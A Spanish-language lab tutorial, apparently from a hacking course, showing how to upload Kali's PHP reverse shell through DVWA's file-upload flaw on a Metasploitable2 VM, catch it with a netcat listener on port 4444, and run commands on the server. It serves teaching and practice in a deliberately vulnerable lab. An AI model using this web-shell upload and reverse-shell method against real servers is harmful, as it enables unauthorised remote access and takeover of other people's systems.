# 34. Subiendo una Web Shell en php y accediendo a una maquina

Vamos a ver a cómo obtener acceso a el servidor, a una máquina, por medio de una **reverse shell** que vamos a subir a una página web y por
medio de esta *reverse shell*, de este archivo malicioso, vamos a poder obtener un acceso remoto a el servidor en el cual está hospedado un sitio
web el cual es vulnerable a **ataques de inclusión/subida de archivos**.

Este tipo de ataques se suele dar en aplicaciones web que permiten la subida de archivos, como imágenes.

Podemos subir un archivo cualquiera, un archivo malicioso, que puede darnos una conexión al servidor.

## Primer requisito

Tener instalado **Metasploitable2**, la máquina virtual.

Despues de iniciar sesión con el usuario `msfadmin` y contraseña `msfadmin`, hacemos un:

```bash
ifconfig
```

Para ver su dirección IP, la copiamos y pegamos en el navegador de nuestra máquina Kali Linux.

## DVWA

Accedemos a `DVWA` que es un sitio web
vulnerable que nos va a pedir un **Login**:

```plaintext
Username: admin
Password: password
```

Le damos a **Login** y accederemos a la página web vulnerable.

Nos vamos a **DVWA Security**:

* Le damos a **low**, para tener la seguridad baja

>Seguridad alta (**high**), consiste en enviar la petición HTTP modificada que hacemos al servidor, modificada con ciertos parámetros y
>así poder evadir esto

Nos vamos a **Upload**, y nos vamos a aprovechar de la vulnerabilidad llamada **File Upload** (subida de archivos).

Podemos darle en **Browse...** y subir el archivo que nosotros queramos, subirlo al servidor y listo. Pero nosotros vamos a aprovercharnos de
vulnerabilidades.

En este caso, vamos a subir una **web shell**, un archivo malicioso que nos de acceso de forma remota, una conexión reversa (**reverse shell**).
Significa que la víctima, una vez que enviamos el archivo malicioso se nos va a conectar otorgándonos una terminal, un acceso a la consola de
Linux y a la máquina completa.

## Creando una Web Shell en PHP

Para crear una **web shell**, nos vamos a la terminal y escribimos:

```bash
ls /usr/share/webshells/php/php-reverse-shell.php
```

No lo ejecutamos, sólo copiamos la ruta y nos vamos al directorio en el cual queremos crear la *web shell*.
En este caso, el directorio es `Escritorio` y hacemos:

```bash
cd Desktop
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
ls
```

Ahora tendremos el archivo `shell.php`, el cual tenemos que modificar con ciertos parámetros, porque si lo subimos así no va a correr.

Hacemos:

```bash
nano shell.php
```

Y en una nueva terminal, hacemos:

```bash
ifconfig
```

Para obtener datos de la dirección IP, y modificamos el parámetro `$ip`:

```php
$ip = '<own-ip>';
$port = 4444;
```

Hacemos **Ctrl + O** y **Ctrl + X** para guardar y salir. Si se nos hace muy difícil usar `nano`, podemos usar la herramienta `leaafpad`:

```bash
sudo apt-get install leafpad
leafpad shell.php
```

Y podemos modificarlo con un editor gráfico.

Hacemos un:

```bash
cls
ls
```

Tenemos `shell.php` que vamos a subir al servidor, pero como es una *conexiónn reversa*, tenemos que tener nuestra computadora atacante a la
escucha de una conexión que realice la víctima.

La víctima se va a conectar a nosotros y tenemos que estar a la escucha de una conexión. Hacemos:

```bash
nc -lvp 4444
```

* `-l`: `listener`, para estar a la escucha de una conexión
* `-v`: Modo `verbose`
* `-p`: Para indicar el puerto en el cual se va a realizar la conexión. En este caso, el `4444` como indicamos en el archivo `shell.php`

Y le damos **Enter** para que quede a la escucha de una conexión.

## Subiendo la Web Shell

Nos vamos a la aplicación web, subimos el archivo `shell.php` y le damos a **Upload**. Deberíamos ver una confirmación de que se subió:

```plaintext
../../hackable/uploads/shell.php succesfully uploaded!
```

Nos dice el directorio donde se subió. Copiamos esa ruta y la pegamos en la url de nuestra aplicación web:

```plaintext
<metasploitable2-ip>/dvwa/vulnerabilities/upload/../../hackable/uploads/shell.php
```

Le damos un **Enter** para ejecutarlo, y ya deberíamos de habernos conectado a la conexión de *NetCat* y tener un acceso al servidor, a la
máquina víctima y ejecutar cualquier comando:

```bash
sh-3.2$ ls
sh-3.2$ pwd
```

Estamos en el directorio raíz `/`. Podemos acceder a la carpeta:

```bash
sh-3.2$ cd usr/
sh-3.2$ ls
sh-3.2$ cd src
sh-3.2$ ls
sh-3.2$ pwd
```

Podemos poner el comando que queramos, **escalar privilegios**, etc. Nos aprovechamos de una vulnerabilidad de *subida de archivos*, en el cual
subimos un archivo a el servidor, y el servidor lo ejecuta.
Básicamente, es un *malware* que se ejecuta del lado del servidor (spawnear una shell) y el servidor nos da un acceso a el equipo víctima.

La vulnerabilidad de *inclusión de archivos* la vamos a encontrar mucho en **CTFs** (Capture The Flag), también en *Pentest* real.
Obviamente no va a ser tan fácil, tendremos que modificar peticiones con **Burp Suite**, mandar la petición y modificar ciertos parámetros.